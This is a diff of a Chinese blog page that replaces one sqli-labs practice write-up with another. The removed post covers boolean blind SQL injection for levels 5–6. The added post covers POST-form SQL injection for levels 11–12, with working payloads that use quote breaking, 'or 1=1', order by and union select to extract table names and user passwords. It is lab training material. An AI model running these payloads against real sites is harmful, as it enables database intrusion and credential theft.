@@ -20,19 +20,19 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="第五关输入?&#x3D;1正确，就输出you are in……；如果输入?&#x3D;-1不正确，就不输出。因此可以根据这个现象来推测,这是一个经典的bool盲注。 先做一些sql语句的复习： 1、length(database()) 是得到数据库的字符串长度。 2、substr(var1, var2, var3)  从字符串里截取其中一段字符（串）   - var1：被截取的字符串   - var2：从哪一位开始截">
+  <meta name="description" content="在之前的十关是get型，接下来是post型 我个人用的是火狐浏览器，提前下载好了hackbar，http header live等插件，方便操作。 第十一关抓包先打开http header libve,接着输入用户名与密码（都为admin）就行抓包得到：uname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit将其添加到hackbar的post data中。 验证">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli—labs练习(第五、六关):bool盲注">
-<meta property="og:url" content="http://example.com/2020/12/12/article-title-4/index.html">
+<meta property="og:title" content="sqli-labs练习(第十一、十二关)">
+<meta property="og:url" content="http://example.com/2020/12/13/article-title-7/index.html">
 <meta property="og:site_name" content="Yanghaoxuan&#39;sBlog">
-<meta property="og:description" content="第五关输入?&#x3D;1正确，就输出you are in……；如果输入?&#x3D;-1不正确，就不输出。因此可以根据这个现象来推测,这是一个经典的bool盲注。 先做一些sql语句的复习： 1、length(database()) 是得到数据库的字符串长度。 2、substr(var1, var2, var3)  从字符串里截取其中一段字符（串）   - var1：被截取的字符串   - var2：从哪一位开始截">
+<meta property="og:description" content="在之前的十关是get型，接下来是post型 我个人用的是火狐浏览器，提前下载好了hackbar，http header live等插件，方便操作。 第十一关抓包先打开http header libve,接着输入用户名与密码（都为admin）就行抓包得到：uname&#x3D;admin&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit将其添加到hackbar的post data中。 验证">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-12-12T06:48:36.000Z">
-<meta property="article:modified_time" content="2020-12-12T07:09:15.621Z">
+<meta property="article:published_time" content="2020-12-13T11:59:08.000Z">
+<meta property="article:modified_time" content="2020-12-13T12:53:54.811Z">
 <meta property="article:author" content="Yanghaoxuan">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/2020/12/12/article-title-4/">
+<link rel="canonical" href="http://example.com/2020/12/13/article-title-7/">
 
 
 <script id="page-configurations">
@@ -45,7 +45,7 @@
   };
 </script>
 
-  <title>sqli—labs练习(第五、六关):bool盲注 | Yanghaoxuan'sBlog</title>
+  <title>sqli-labs练习(第十一、十二关) | Yanghaoxuan'sBlog</title>
   
 
 
@@ -150,7 +150,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/12/article-title-4/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/13/article-title-7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -163,7 +163,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          sqli—labs练习(第五、六关):bool盲注
+          sqli-labs练习(第十一、十二关)
         </h1>
 
         <div class="post-meta">
@@ -174,7 +174,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-12-12 14:48:36 / 修改时间：15:09:15" itemprop="dateCreated datePublished" datetime="2020-12-12T14:48:36+08:00">2020-12-12</time>
+              <time title="创建时间：2020-12-13 19:59:08 / 修改时间：20:53:54" itemprop="dateCreated datePublished" datetime="2020-12-13T19:59:08+08:00">2020-12-13</time>
             </span>
 
           
@@ -188,26 +188,19 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><p>输入?=1正确，就输出you are in……；如果输入?=-1不正确，就不输出。<br>因此可以根据这个现象来推测,这是一个经典的bool盲注。</p>
-<p>先做一些sql语句的复习：</p>
-<p><code>1、length(database())</code> 是得到数据库的字符串长度。</p>
-<p><code>2、substr(var1, var2, var3)</code>  从字符串里截取其中一段字符（串）   - var1：被截取的字符串   - var2：从哪一位开始截取   - var3：截取长度 。</p>
-<p><code>3、ascii(var)</code> 取var字符的ascii码（十进制）。</p>
-<h2 id="1、数据库长度"><a href="#1、数据库长度" class="headerlink" title="1、数据库长度"></a>1、数据库长度</h2><p><code>?id=3&#39; and length(database())&gt;7--+</code></p>
-<p><code>&#39;</code> 的作用，是闭合。字符串长度大于7，没报错。</p>
-<p>再输入<code>?id=3&#39; and length(database())&gt;8--+</code></p>
-<p>报错，说明数据库长度不大于8，即数据库的名字有8个字符。</p>
-<h2 id="2、获得数据库名"><a href="#2、获得数据库名" class="headerlink" title="2、获得数据库名"></a>2、获得数据库名</h2><p><code>?id=3&#39; and ascii(substr(database(),1,1))&gt;114--+</code>不报错</p>
-<p><code>?id=3&#39; and ascii(substr(database(),1,1))&gt;115--+</code>报错</p>
-<p>数据库的第一位字符的ASCII码值大于114，不大于115，所以是115，所以数据库的第一个字符是s。</p>
-<p>接下来挨个尝试，最终得出数据库名为security。</p>
-<h2 id="3、获取表名"><a href="#3、获取表名" class="headerlink" title="3、获取表名"></a>3、获取表名</h2><p><code>*?id=3&#39;  and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),1,1))&gt;100--+*</code>正常</p>
-<p><code>*?id=3&#39;  and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),1,1))&gt;101--+*</code>报错</p>
-<p>说明表名的第一个字符是e,接下来可以得出第一个表名为emails</p>
-<p>接下来用limit输出其他表名</p>
-<p>….</p>
-<p>再得出列名、字段。</p>
-<h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><p>与第五关同样操作，不过单引号换成了双引号 </p>
+        <p>在之前的十关是get型，接下来是post型</p>
+<p>我个人用的是火狐浏览器，提前下载好了hackbar，http header live等插件，方便操作。</p>
+<h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h3><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><p>先打开http header libve,接着输入用户名与密码（都为admin）就行抓包得到：<code>uname=admin&amp;passwd=admin&amp;submit=Submit</code>将其添加到hackbar的post data中。</p>
+<h4 id="验证注入漏洞"><a href="#验证注入漏洞" class="headerlink" title="验证注入漏洞"></a>验证注入漏洞</h4><p><code>uname=admin&#39;&amp;passwd=admin&amp;submit=Submit</code>在用户名后面加上单引号，发现报错，说明有注入漏洞。</p>
+<p><code>uname=admin&#39; or 1=1 #&amp;passwd=admin&amp;submit=Submit</code>接下来加上<code>or</code>语句与注释符<code>#</code>（注意不能是–+，– ），发现并未报错。</p>
+<p>接着就是最基础的步骤，如同第一关</p>
+<p>确定字段数量，确认占位信息，查库、表、字段</p>
+<p><code>uname=adm&#39; order by 3 #&amp;passwd=admin&amp;submit=Submit</code>报错</p>
+<p><code>uname=adm&#39; order by 2 #&amp;passwd=admin&amp;submit=Submit</code>正常，说明字段数为2</p>
+<p><code>uname=adm&#39; union select 1,database() #&amp;passwd=admin&amp;submit=Submit</code>得出库名<code>security</code></p>
+<p><code>uname=adm&#39; union select 1, table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1#&amp;passwd=admin&amp;submit=Submit</code>用limit将表名一个一个输出</p>
+<p>字段可以用limit单个输出，也可以一次性输出，如：<code>uname=adm&#39; union select 1, group_concat(concat_ws(0x7e,username,password)) from users #&amp;passwd=admin&amp;submit=Submit</code></p>
+<h3 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h3><p>与第十一关相同，只不过把<code>‘</code>改成<code>“）</code></p>
 
     </div>
 
@@ -223,12 +216,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/12/12/article-title-3/" rel="prev" title="sqli-labs练习（第三、四关）">
-      <i class="fa fa-chevron-left"></i> sqli-labs练习（第三、四关）
+    <a href="/2020/12/13/article-title-6/" rel="prev" title="sqli-labs(第九、十关):延时盲注">
+      <i class="fa fa-chevron-left"></i> sqli-labs(第九、十关):延时盲注
     </a></div>
       <div class="post-nav-item">
-    <a href="/2020/12/13/article-title-5/" rel="next" title="sqli—labs练习(第七关)文件上传漏洞">
-      sqli—labs练习(第七关)文件上传漏洞 <i class="fa fa-chevron-right"></i>
+    <a href="/2020/12/13/article-title-8/" rel="next" title="sqli-labs(第十三、十四关)">
+      sqli-labs(第十三、十四关) <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -288,7 +281,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3"><span class="nav-number">1.</span> <span class="nav-text">第五关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6"><span class="nav-number">1.1.</span> <span class="nav-text">1、数据库长度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E8%8E%B7%E5%BE%97%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">1.2.</span> <span class="nav-text">2、获得数据库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E3%80%81%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D"><span class="nav-number">1.3.</span> <span class="nav-text">3、获取表名</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E5%85%B3"><span class="nav-number">2.</span> <span class="nav-text">第六关</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3"><span class="nav-number">1.</span> <span class="nav-text">第十一关</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%93%E5%8C%85"><span class="nav-number">1.1.</span> <span class="nav-text">抓包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.</span> <span class="nav-text">验证注入漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%85%B3"><span class="nav-number">2.</span> <span class="nav-text">第十二关</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
